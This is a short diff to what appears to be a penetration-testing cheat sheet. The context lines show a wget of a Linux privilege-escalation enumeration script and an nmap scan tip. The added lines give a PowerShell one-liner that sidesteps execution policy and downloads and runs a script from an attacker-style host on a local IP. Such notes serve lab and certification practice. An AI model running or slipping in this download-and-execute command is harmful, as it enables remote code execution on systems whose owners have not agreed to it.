@@ -125,3 +125,6 @@ wget "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh
 
 If ports show up as filtered on nmap try:
 nmap -sS -v -v -Pn <IP>
+
+Bypass execution policy Powershell:
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://192.168.119.149:8081/login.ps1')"
